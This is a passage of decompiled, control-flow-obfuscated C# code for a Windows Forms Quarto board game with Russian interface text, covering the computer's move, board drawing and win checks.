					continue;
				case 7u:
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -1909372265) ^ 0x31FF8F84;
					continue;
				case 6u:
					num = (int)(num2 * 1820534621) ^ -1108278221;
					continue;
				case 5u:
					num3 = 0;
					num = ((int)num2 * -800186987) ^ -1383114032;
					continue;
				case 4u:
					if (board[num8, num7] == null)
					{
						num = -348847431;
						num9 = -348847431;
						continue;
					}
					goto IL_0115;
				case 3u:
					Paint_Board();
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 581684195) ^ -1666800307;
					continue;
				case 2u:
				{
					int num6;
					if (num3 >= 4)
					{
						num = -1302872909;
						num6 = -1302872909;
					}
					else
					{
						num = -373997005;
						num6 = -373997005;
					}
					continue;
				}
				case 1u:
					num3++;
					num = (int)(num2 * 914218212) ^ -432534235;
					continue;
				case 0u:
				{
					int num5;
					if (!(Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Blue))
					{
						num = -830286138;
						num5 = -830286138;
					}
					else
					{
						num = -245639976;
						num5 = -245639976;
					}
					continue;
				}
				default:
					return;
				case 10u:
					break;
				case 24u:
					return;
					IL_0115:
					num = -1302872909;
					num9 = -1302872909;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0f70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f9e: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		Graphics graphics_ = default(Graphics);
		int num34 = default(int);
		int num22 = default(int);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		int num21 = default(int);
		int num8 = default(int);
		int num9 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		int num7 = default(int);
		int num6 = default(int);
		int num14 = default(int);
		bool flag13 = default(bool);
		bool flag8 = default(bool);
		int num27 = default(int);
		int num28 = default(int);
		int num25 = default(int);
		int num26 = default(int);
		Figurine[,] array = default(Figurine[,]);
		int num15 = default(int);
		int num16 = default(int);
		int num17 = default(int);
		bool flag14 = default(bool);
		int num44 = default(int);
		bool flag10 = default(bool);
		int num20 = default(int);
		bool flag9 = default(bool);
		bool flag16 = default(bool);
		int num36 = default(int);
		int num29 = default(int);
		bool flag12 = default(bool);
		int num35 = default(int);
		Figurine[,] array2 = default(Figurine[,]);
		int num37 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool flag15 = default(bool);
		bool flag6 = default(bool);
		bool flag11 = default(bool);
		bool flag7 = default(bool);
		bool flag5 = default(bool);
		while (true)
		{
			int num = 1486237238;
			while (true)
			{
				uint num2;
				int num53;
				int num45;
				int num5;
				int num56;
				switch ((num2 = (uint)num ^ 0x50E74EB8u) % 177u)
				{
				case 176u:
					num = 1906535846;
					continue;
				case 175u:
					num = (int)((num2 * 1531898464) ^ 0x713D1B2D);
					continue;
				case 174u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1802151865) ^ -434982788;
					continue;
				case 173u:
					num = 1300563561;
					continue;
				case 172u:
					step++;
					num = (int)(num2 * 241274999) ^ -1914891209;
					continue;
				case 171u:
					if (!Standoff(board))
					{
						num = 1874570540;
						num53 = 1874570540;
						continue;
					}
					goto IL_0089;
				case 170u:
					num = ((int)num2 * -1382979525) ^ -633907595;
					continue;
				case 169u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num34 = 0;
					num = ((int)num2 * -1934185684) ^ -1037087354;
					continue;
				case 168u:
					num22++;
					num = (int)((num2 * 1462270233) ^ 0x3D55BF39);
					continue;
				case 167u:
				{
					int num12;
					int num13;
					if (!flag3)
					{
						num12 = 1742287338;
						num13 = 1742287338;
					}
					else
					{
						num12 = 789271938;
						num13 = 789271938;
					}
					num = num12 ^ (int)(num2 * 1967790909);
					continue;
				}
				case 166u:
					num = (int)(num2 * 1957420662) ^ -1389068447;
					continue;
				case 165u:
					if (!flag4)
					{
						num = (int)(num2 * 418444514) ^ -99299619;
						continue;
					}
					goto IL_015b;
				case 164u:
					flag4 = false;
					num = ((int)num2 * -694321806) ^ -584460619;
					continue;
				case 163u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)(num2 * 1082663620) ^ -1961941685;
					continue;
				case 162u:
					num21 = 0;
					num = ((int)num2 * -2138550126) ^ 0x44276362;
					continue;
				case 161u:
					Form1.smethod_47(1000);
					num = (int)(num2 * 792873670) ^ -1211481155;
					continue;
				case 160u:
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					num = ((int)num2 * -600441275) ^ -1165483370;
					continue;
				case 159u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)((num2 * 2112962526) ^ 0x1B05276A);
					continue;
				case 158u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					array3[num7, num6] = new Figurine(storage[num8, num9]);
					num = ((int)num2 * -825811499) ^ -532558266;
					continue;
				case 157u:
					num14++;
					num = ((int)num2 * -1384933406) ^ 0x538DB59A;
					continue;
				case 156u:
					num = (int)((num2 * 801984336) ^ 0x46D62DD8);
					continue;
				case 155u:
				{
					int num55;
					if (num34 < 4)
					{
						num = 1645828255;
						num55 = 1645828255;
					}
					else
					{
						num = 195098816;
						num55 = 195098816;
					}
					continue;
				}
				case 154u:
					num = ((int)num2 * -643651426) ^ -1717415498;
					continue;
				case 153u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 1290264617) ^ 0x8C1E841);
					continue;
				case 152u:
				{
					int num49;
					int num50;
					if (!flag13)
					{
						num49 = -441163706;
						num50 = -441163706;
					}
					else
					{
						num49 = -2121436607;
						num50 = -2121436607;
					}
					num = num49 ^ ((int)num2 * -1850712199);
					continue;
				}
				case 151u:
					num = (int)(num2 * 463294245) ^ -381969364;
					continue;
				case 150u:
					num34++;
					num = ((int)num2 * -884439897) ^ 0x62786D2D;
					continue;
				case 149u:
					num7 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -203845713) ^ 0x3A7435D2;
					continue;
				case 148u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					num = ((int)num2 * -1766847588) ^ -1164907550;
					continue;
				case 147u:
					flag13 = board[num7, num6] != null;
					num = ((int)num2 * -754194594) ^ -1237313464;
					continue;
				case 146u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 2027352803) ^ 0x634C4370);
					continue;
				case 145u:
					num = ((int)num2 * -1120278178) ^ -971938989;
					continue;
				case 144u:
					num = (int)((num2 * 1298955780) ^ 0x775E55A0);
					continue;
				case 143u:
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = (int)(num2 * 368406927) ^ -1903189443;
					continue;
				case 142u:
					num8 = 0;
					num9 = 0;
					num = ((int)num2 * -1166486449) ^ 0x168254E1;
					continue;
				case 141u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = ((int)num2 * -78108057) ^ 0x447243F1;
					continue;
				case 140u:
					num = ((int)num2 * -1836575228) ^ 0x4D1B4A6C;
					continue;
				case 139u:
				{
					int num32;
					int num33;
					if (!flag8)
					{
						num32 = 613958984;
						num33 = 613958984;
					}
					else
					{
						num32 = 2024516460;
						num33 = 2024516460;
					}
					num = num32 ^ (int)(num2 * 953889012);
					continue;
				}
				case 138u:
					num = ((int)num2 * -837298632) ^ -2077563007;
					continue;
				case 137u:
					Form1.smethod_5((Control)(object)borderBox[num8, num9], Color.White);
					num = (int)(num2 * 1652951418) ^ -211979970;
					continue;
				case 136u:
					num = ((int)num2 * -569762076) ^ -402223614;
					continue;
				case 135u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					num = (int)(num2 * 764292591) ^ -1684513686;
					continue;
				case 134u:
					Form1.smethod_20(pictureBox[num27, num28], (Image)null);
					num = ((int)num2 * -1102486698) ^ -955687870;
					continue;
				case 133u:
					storage[num25, num26] = null;
					num = (int)((num2 * 859947453) ^ 0x3720618D);
					continue;
				case 132u:
				{
					array[num14, num15] = new Figurine(storage[num16, num17]);
					int num18;
					int num19;
					if (!Stop(array))
					{
						num18 = 1449732970;
						num19 = 1449732970;
					}
					else
					{
						num18 = 148387521;
						num19 = 148387521;
					}
					num = num18 ^ (int)(num2 * 1305968595);
					continue;
				}
				case 131u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num6 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num6 * size + 4, num7 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1323236767) ^ 0x7F802B1A);
					continue;
				case 130u:
				{
					int num64;
					if (num14 >= 4)
					{
						num = 1962878;
						num64 = 1962878;
					}
					else
					{
						num = 759920949;
						num64 = 759920949;
					}
					continue;
				}
				case 129u:
					num = (int)((num2 * 266913678) ^ 0x2E912F0B);
					continue;
				case 128u:
					num = ((int)num2 * -1055137878) ^ 0x2D004E61;
					continue;
				case 127u:
				{
					int num63;
					if (num21 < 4)
					{
						num = 133998480;
						num63 = 133998480;
					}
					else
					{
						num = 1083568615;
						num63 = 1083568615;
					}
					continue;
				}
				case 126u:
				{
					int num61;
					int num62;
					if (!flag14)
					{
						num61 = -1910280599;
						num62 = -1910280599;
					}
					else
					{
						num61 = -167330882;
						num62 = -167330882;
					}
					num = num61 ^ ((int)num2 * -1336756534);
					continue;
				}
				case 125u:
					Form1.smethod_30((Control)(object)borderBox[num16, num17]);
					num = (int)(num2 * 1456383414) ^ -751019110;
					continue;
				case 124u:
					num44 = 0;
					num = 1384952413;
					continue;
				case 123u:
					flag10 = Form1.smethod_41((Control)(object)borderBox[num27, num28]) == Color.Blue;
					num = ((int)num2 * -468230367) ^ 0x3F6DC389;
					continue;
				case 122u:
					num20 = 0;
					num = ((int)num2 * -1147734462) ^ 0x19AA0C8F;
					continue;
				case 121u:
					num = (int)((num2 * 344042369) ^ 0x17DAC1D7);
					continue;
				case 120u:
					flag9 = Standoff(board);
					num = ((int)num2 * -1197921135) ^ -1580252880;
					continue;
				case 119u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 362127579) ^ 0x4A547915);
					continue;
				case 118u:
					num = 1209437261;
					continue;
				case 117u:
					Form1.smethod_20(pictureBox[num8, num9], (Image)null);
					num = ((int)num2 * -613338067) ^ -2119915340;
					continue;
				case 116u:
					num = ((int)num2 * -2044422040) ^ 0x10C530D6;
					continue;
				case 115u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1021986646) ^ -1429143417;
					continue;
				case 114u:
					storage[num8, num9] = null;
					num = (int)((num2 * 1081332968) ^ 0x427F4A87);
					continue;
				case 113u:
					num = ((int)num2 * -1150059636) ^ 0x9D69F87;
					continue;
				case 112u:
					Form1.smethod_7((Control)(object)pictureBox[num21, num22], bool_0: false);
					num = ((int)num2 * -1809077250) ^ -385453269;
					continue;
				case 111u:
				{
					int num59;
					int num60;
					if (flag16)
					{
						num59 = -1288012968;
						num60 = -1288012968;
					}
					else
					{
						num59 = -1403828998;
						num60 = -1403828998;
					}
					num = num59 ^ (int)(num2 * 317795020);
					continue;
				}
				case 110u:
					board[num36, num29] = new Figurine(storage[num25, num26]);
					num = ((int)num2 * -2081271662) ^ -853557014;
					continue;
				case 109u:
					num = (int)(num2 * 2073877064) ^ -995516006;
					continue;
				case 108u:
				{
					int num57;
					int num58;
					if (flag12)
					{
						num57 = 98538348;
						num58 = 98538348;
					}
					else
					{
						num57 = 30517379;
						num58 = 30517379;
					}
					num = num57 ^ (int)(num2 * 1393522594);
					continue;
				}
				case 107u:
					num35 = 0;
					num = 1120724827;
					continue;
				case 106u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -721724601) ^ -703340594;
					continue;
				case 105u:
					flag16 = num35 < 4;
					num = 1196662325;
					continue;
				case 104u:
					num45 = (Standoff(array2) ? 1 : 0);
					goto IL_097a;
				case 103u:
					Form1.smethod_30((Control)(object)borderBox[num21, num22]);
					num = (int)(num2 * 524206463) ^ -124636080;
					continue;
				case 102u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num35 + 0.05f) * (float)size, ((float)num34 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -769281432) ^ 0x5682C727;
					continue;
				case 101u:
					Paint_Board();
					num = ((int)num2 * -1177557133) ^ -197691170;
					continue;
				case 100u:
					num14 = 0;
					num = (int)((num2 * 1530141128) ^ 0x6A0E6D20);
					continue;
				case 99u:
					num = ((int)num2 * -2009271775) ^ -1455191204;
					continue;
				case 98u:
					if (num17 != num9)
					{
						goto IL_0a5c;
					}
					goto IL_0a68;
				case 97u:
					num = 1396388349;
					continue;
				case 96u:
					Form1.smethod_47(200);
					num = (int)((num2 * 1675096432) ^ 0x7C756A17);
					continue;
				case 95u:
					array = (Figurine[,])Form1.smethod_48((Array)array3);
					num = (int)((num2 * 193272132) ^ 0x77D0CE6A);
					continue;
				case 94u:
					Form1.smethod_30((Control)(object)pictureBox[num8, num9]);
					num = (int)((num2 * 1641557719) ^ 0x4470CFF1);
					continue;
				case 93u:
					num = (int)(num2 * 367970318) ^ -678132461;
					continue;
				case 92u:
					num37 = 0;
					num = ((int)num2 * -1977249062) ^ -1302533075;
					continue;
				case 91u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					array2[num34, num35] = new Figurine(storage[num8, num9]);
					num = (int)((num2 * 42987558) ^ 0x527B4AFF);
					continue;
				case 90u:
					if (num16 == num8)
					{
						num = (int)((num2 * 370685627) ^ 0x696F2C72);
						continue;
					}
					goto IL_0a5c;
				case 89u:
					flag = Standoff(board);
					num = 6676951;
					continue;
				case 88u:
					num = ((int)num2 * -577803299) ^ 0x2D4C85A2;
					continue;
				case 87u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 2089687217;
					continue;
				case 86u:
				{
					int num54;
					if (num22 >= 4)
					{
						num = 254177729;
						num54 = 254177729;
					}
					else
					{
						num = 906418924;
						num54 = 906418924;
					}
					continue;
				}
				case 85u:
					num = (int)((num2 * 1249063040) ^ 0x4F677AB0);
					continue;
				case 84u:
					if (!Stop(board))
					{
						num = ((int)num2 * -1286836011) ^ 0x4AD47E04;
						continue;
					}
					goto IL_0089;
				case 82u:
					num = (int)(num2 * 1861715093) ^ -1534440904;
					continue;
				case 81u:
					flag2 = array3[num14, num15] == null;
					num = 980495909;
					continue;
				case 80u:
				{
					int num51;
					int num52;
					if (flag15)
					{
						num51 = -1051900270;
						num52 = -1051900270;
					}
					else
					{
						num51 = -420971139;
						num52 = -420971139;
					}
					num = num51 ^ ((int)num2 * -134839763);
					continue;
				}
				case 79u:
					num = (int)(num2 * 1595412971) ^ -71441860;
					continue;
				case 78u:
					num22 = 0;
					num = 202057222;
					continue;
				case 77u:
					flag3 = num27 < 4;
					num = 245242901;
					continue;
				case 76u:
					num15 = 0;
					num = 1408980289;
					continue;
				case 75u:
					num16 = Form1.smethod_33(rnd, 4);
					num17 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 416540481) ^ -1931681585;
					continue;
				case 74u:
					Form1.smethod_30((Control)(object)pictureBox[num27, num28]);
					num = (int)(num2 * 1818408861) ^ -1204355134;
					continue;
				case 73u:
					num21++;
					num = (int)((num2 * 101142692) ^ 0x7B2A0762);
					continue;
				case 71u:
					Form1.smethod_47(200);
					num = (int)((num2 * 1996694837) ^ 0x7F8A9F5D);
					continue;
				case 70u:
				{
					int num47;
					int num48;
					if (flag6)
					{
						num47 = -1185012759;
						num48 = -1185012759;
					}
					else
					{
						num47 = -500430471;
						num48 = -500430471;
					}
					num = num47 ^ ((int)num2 * -722004455);
					continue;
				}
				case 69u:
					num8 = num21;
					num = ((int)num2 * -1076683109) ^ 0x36670829;
					continue;
				case 68u:
					flag11 = num37 < 4;
					num = 1666923443;
					continue;
				case 67u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1268224768) ^ -879897039;
					continue;
				case 66u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)((num2 * 642023176) ^ 0x5E52FD65);
					continue;
				case 65u:
					num = ((int)num2 * -697012082) ^ 0x67DA7949;
					continue;
				case 64u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num8, num9]), num35 * size + 4, num34 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1183885381) ^ -855442732;
					continue;
				case 63u:
					Form1.smethod_7((Control)(object)pictureBox[num37, num44], bool_0: true);
					num44++;
					num = 515492795;
					continue;
				case 62u:
					num28++;
					num = (int)((num2 * 1466023401) ^ 0x4A2CB49A);
					continue;
				case 61u:
					num = ((int)num2 * -1449185541) ^ -187694391;
					continue;
				case 60u:
					flag7 = board[num34, num35] == null;
					num = 1817077154;
					continue;
				case 59u:
					num = ((int)num2 * -1167091287) ^ 0x41BAF79D;
					continue;
				case 58u:
				{
					int num46;
					if (num15 < 4)
					{
						num = 1119609503;
						num46 = 1119609503;
					}
					else
					{
						num = 1244539502;
						num46 = 1244539502;
					}
					continue;
				}
				case 57u:
					Form1.smethod_5((Control)(object)borderBox[num21, num22], Color.LimeGreen);
					num = ((int)num2 * -2115610529) ^ -7067650;
					continue;
				case 56u:
					num = 1812444171;
					continue;
				case 55u:
					num = 444682546;
					continue;
				case 54u:
					num6 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 837563418) ^ -190700928;
					continue;
				case 53u:
					num = (int)(num2 * 1178196056) ^ -1705809282;
					continue;
				case 52u:
					num = 1565104338;
					continue;
				case 51u:
					flag14 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num28 * size + size / 2, (int)(((float)num27 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = 2110310452;
					continue;
				case 50u:
					if (!Stop(array2))
					{
						num = ((int)num2 * -497554099) ^ 0x527DF008;
						continue;
					}
					num45 = 1;
					goto IL_097a;
				case 49u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1718459284) ^ -754942036;
					continue;
				case 48u:
					num25 = num27;
					num26 = num28;
					num = ((int)num2 * -663645845) ^ 0x6DF836CF;
					continue;
				case 47u:
					flag12 = Form1.smethod_46((Control)(object)pictureBox1);
					num = (int)(num2 * 2135134245) ^ -1931613361;
					continue;
				case 46u:
					num25 = 0;
					num26 = 0;
					num36 = 0;
					num = ((int)num2 * -1615837863) ^ -225604532;
					continue;
				case 45u:
					num29 = 0;
					num27 = 0;
					num = (int)(num2 * 873880891) ^ -2102014518;
					continue;
				case 44u:
					num = (int)(num2 * 916284238) ^ -1667421070;
					continue;
				case 43u:
					num = 229436992;
					continue;
				case 42u:
					num35++;
					num = 1159259229;
					continue;
				case 41u:
					flag8 = num44 < 4;
					num = 1403058086;
					continue;
				case 40u:
				{
					int num42;
					int num43;
					if (!flag11)
					{
						num42 = -112769991;
						num43 = -112769991;
					}
					else
					{
						num42 = -945020410;
						num43 = -945020410;
					}
					num = num42 ^ ((int)num2 * -2003687649);
					continue;
				}
				case 39u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -475588779) ^ -1484243183;
					continue;
				case 38u:
					num = ((int)num2 * -1729514381) ^ -1351348507;
					continue;
				case 37u:
					num = 798846312;
					continue;
				case 36u:
					board[num7, num6] = new Figurine(storage[num8, num9]);
					storage[num8, num9] = null;
					Form1.smethod_5((Control)(object)borderBox[num16, num17], Color.Blue);
					num = ((int)num2 * -110101194) ^ -1936867487;
					continue;
				case 35u:
				{
					int num40;
					int num41;
					if (!flag10)
					{
						num40 = 1943717054;
						num41 = 1943717054;
					}
					else
					{
						num40 = 1535317927;
						num41 = 1535317927;
					}
					num = num40 ^ ((int)num2 * -511734197);
					continue;
				}
				case 34u:
					num27++;
					num = ((int)num2 * -1451584531) ^ 0x534BCA35;
					continue;
				case 33u:
					num15++;
					num = 1408980289;
					continue;
				case 32u:
					num = ((int)num2 * -1000181254) ^ 0x6B78DE3E;
					continue;
				case 31u:
					num = 1265331548;
					continue;
				case 30u:
				{
					int num38;
					int num39;
					if (!flag9)
					{
						num38 = 240525423;
						num39 = 240525423;
					}
					else
					{
						num38 = 594340271;
						num39 = 594340271;
					}
					num = num38 ^ (int)(num2 * 24523432);
					continue;
				}
				case 29u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					Form1.smethod_15(timer1);
					num = (int)(num2 * 898613202) ^ -859085171;
					continue;
				case 28u:
					num37++;
					num = (int)(num2 * 2009631839) ^ -1702445764;
					continue;
				case 27u:
					num = ((int)num2 * -1123995746) ^ -1211000768;
					continue;
				case 26u:
					num36 = num27;
					num = ((int)num2 * -1411859716) ^ -602260670;
					continue;
				case 25u:
					board[num34, num35] = new Figurine(storage[num8, num9]);
					num = (int)(num2 * 404532689) ^ -2014226472;
					continue;
				case 24u:
					num = (int)((num2 * 286592493) ^ 0x25068BC);
					continue;
				case 23u:
					if (num20 >= 9)
					{
						num = 1733553796;
						num5 = 1733553796;
						continue;
					}
					goto IL_015b;
				case 22u:
				{
					int num30;
					int num31;
					if (flag7)
					{
						num30 = -1559177225;
						num31 = -1559177225;
					}
					else
					{
						num30 = -1392212806;
						num31 = -1392212806;
					}
					num = num30 ^ ((int)num2 * -490006524);
					continue;
				}
				case 21u:
					flag6 = num28 < 4;
					num = 462035516;
					continue;
				case 20u:
					Form1.smethod_5((Control)(object)borderBox[num27, num28], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num27, num28]);
					num = ((int)num2 * -2007228655) ^ 0x1DAA3F17;
					continue;
				case 19u:
					Form1.smethod_30((Control)(object)borderBox[num8, num9]);
					num = ((int)num2 * -570531777) ^ -1371946075;
					continue;
				case 18u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1110718747) ^ 0x5FFF963F;
					continue;
				case 17u:
					num29 = num28;
					num = (int)((num2 * 850397995) ^ 0x797A55E0);
					continue;
				case 16u:
					num = (int)(num2 * 1481191974) ^ -1875422086;
					continue;
				case 15u:
					num28 = 0;
					num = 417523047;
					continue;
				case 14u:
					num9 = num22;
					num = (int)(num2 * 1254506657) ^ -2143108496;
					continue;
				case 13u:
					if (storage[num16, num17] != null)
					{
						num = (int)((num2 * 370586300) ^ 0x51A57E7D);
						continue;
					}
					goto IL_0a68;
				case 12u:
					Form1.smethod_15(timer1);
					num = 1997955892;
					continue;
				case 11u:
					num = (int)((num2 * 292165636) ^ 0x15CD37D6);
					continue;
				case 10u:
					num = 1691963571;
					continue;
				case 9u:
				{
					int num23;
					int num24;
					if (!flag5)
					{
						num23 = 1263819781;
						num24 = 1263819781;
					}
					else
					{
						num23 = 1721427015;
						num24 = 1721427015;
					}
					num = num23 ^ ((int)num2 * -792965312);
					continue;
				}
				case 8u:
					num = ((int)num2 * -103049338) ^ -671137870;
					continue;
				case 7u:
					num = ((int)num2 * -996731110) ^ 0x40F6A0A8;
					continue;
				case 6u:
					flag5 = Form1.smethod_41((Control)(object)borderBox[num21, num22]) == Color.Red;
					num = ((int)num2 * -527750757) ^ -410625526;
					continue;
				case 5u:
					num = ((int)num2 * -278493331) ^ 0x713218B9;
					continue;
				case 4u:
					flag4 = true;
					num = (int)((num2 * 2028292552) ^ 0x117243EC);
					continue;
				case 3u:
					num20++;
					num = 1731548916;
					continue;
				case 2u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = 412255916;
						num11 = 412255916;
					}
					else
					{
						num10 = 1707377339;
						num11 = 1707377339;
					}
					num = num10 ^ ((int)num2 * -1984216454);
					continue;
				}
				case 1u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 77420643;
						num4 = 77420643;
					}
					else
					{
						num3 = 673291208;
						num4 = 673291208;
					}
					num = num3 ^ ((int)num2 * -1166102924);
					continue;
				}
				case 0u:
					num = ((int)num2 * -211861312) ^ 0xC061028;
					continue;
				default:
					return;
				case 83u:
					break;
				case 72u:
					return;
					IL_015b:
					num = 495867519;
					num5 = 495867519;
					continue;
					IL_0089:
					num = 1438236863;
					num53 = 1438236863;
					continue;
					IL_0a5c:
					num = 1064852325;
					num56 = 1064852325;
					continue;
					IL_0a68:
					num = 1494690154;
					num56 = 1494690154;
					continue;
					IL_097a:
					flag15 = (byte)num45 != 0;
					num = 2055727228;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num5 = default(int);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1324115509;
			while (true)
			{
				uint num2;
				int num12;
				int num40;
				switch ((num2 = (uint)num ^ 0xB7A67A00u) % 76u)
				{
				case 75u:
				{
					int num24;
					if (num5 < 4)
					{
						num = -602567601;
						num24 = -602567601;
					}
					else
					{
						num = -2078661466;
						num24 = -2078661466;
					}
					continue;
				}
				case 74u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)((num2 * 1335222122) ^ 0x6A5480EC);
						continue;
					}
					goto IL_0058;
				case 73u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -707718715) ^ -1552683485;
						continue;
					}
					goto IL_0082;
				case 72u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)(num2 * 1614850577) ^ -113781109;
						continue;
					}
					goto IL_0058;
				case 71u:
				{
					int num10;
					int num11;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num10 = 1628989973;
						num11 = 1628989973;
					}
					else
					{
						num10 = 42137952;
						num11 = 42137952;
					}
					num = num10 ^ (int)(num2 * 1067754618);
					continue;
				}
				case 70u:
				{
					int num60;
					int num61;
					if (mem[num5, 0].Big == mem[num5, 1].Big)
					{
						num60 = -2239942;
						num61 = -2239942;
					}
					else
					{
						num60 = -1400454631;
						num61 = -1400454631;
					}
					num = num60 ^ ((int)num2 * -69906824);
					continue;
				}
				case 69u:
				{
					int num43;
					if (mem[num5, 0].Dark != mem[num5, 1].Dark)
					{
						num = -1553424607;
						num43 = -1553424607;
					}
					else
					{
						num = -1226707648;
						num43 = -1226707648;
					}
					continue;
				}
				case 68u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = (int)((num2 * 2123822425) ^ 0x40909D95);
						continue;
					}
					goto IL_01a0;
				case 67u:
				{
					int num4;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = -1727914864;
						num4 = -1727914864;
					}
					else
					{
						num = -110430235;
						num4 = -110430235;
					}
					continue;
				}
				case 66u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = (int)(num2 * 1204533938) ^ -1706728939;
						continue;
					}
					goto IL_01a0;
				case 65u:
				{
					int num48;
					int num49;
					if (mem[num5, 3] != null)
					{
						num48 = 1357182443;
						num49 = 1357182443;
					}
					else
					{
						num48 = 506931455;
						num49 = 506931455;
					}
					num = num48 ^ ((int)num2 * -1088525987);
					continue;
				}
				case 64u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)((num2 * 1676371442) ^ 0x5CF26BA1);
						continue;
					}
					goto IL_0287;
				case 63u:
				{
					int num29;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = -1658037162;
						num29 = -1658037162;
					}
					else
					{
						num = -1370199309;
						num29 = -1370199309;
					}
					continue;
				}
				case 62u:
				{
					int num20;
					int num21;
					if (mem[num5, 1].Square == mem[num5, 2].Square)
					{
						num20 = 466645959;
						num21 = 466645959;
					}
					else
					{
						num20 = 1567846240;
						num21 = 1567846240;
					}
					num = num20 ^ ((int)num2 * -1181592159);
					continue;
				}
				case 61u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = (int)(num2 * 1153872894) ^ -568317904;
						continue;
					}
					goto IL_01a0;
				case 60u:
				{
					int num65;
					int num66;
					if (mem[1, num5].Dark == mem[2, num5].Dark)
					{
						num65 = -683563479;
						num66 = -683563479;
					}
					else
					{
						num65 = -1010978969;
						num66 = -1010978969;
					}
					num = num65 ^ ((int)num2 * -255076810);
					continue;
				}
				case 59u:
				{
					int num59;
					if (mem[num5, 0].Square != mem[num5, 1].Square)
					{
						num = -401857922;
						num59 = -401857922;
					}
					else
					{
						num = -912775586;
						num59 = -912775586;
					}
					continue;
				}
				case 58u:
					if (mem[0, num5] != null)
					{
						num = -1513203754;
						continue;
					}
					goto IL_01ac;
				case 57u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = ((int)num2 * -1356952319) ^ 0x7A8581E2;
						continue;
					}
					goto IL_01ac;
				case 56u:
				{
					int num45;
					int num46;
					if (mem[num5, 1].Dark != mem[num5, 2].Dark)
					{
						num45 = 318439009;
						num46 = 318439009;
					}
					else
					{
						num45 = 1864254826;
						num46 = 1864254826;
					}
					num = num45 ^ (int)(num2 * 1240405321);
					continue;
				}
				case 55u:
				{
					int num34;
					int num35;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num34 = -37530595;
						num35 = -37530595;
					}
					else
					{
						num34 = -1240218276;
						num35 = -1240218276;
					}
					num = num34 ^ ((int)num2 * -582491059);
					continue;
				}
				case 54u:
				{
					int num30;
					int num31;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num30 = 1744813200;
						num31 = 1744813200;
					}
					else
					{
						num30 = 2118699621;
						num31 = 2118699621;
					}
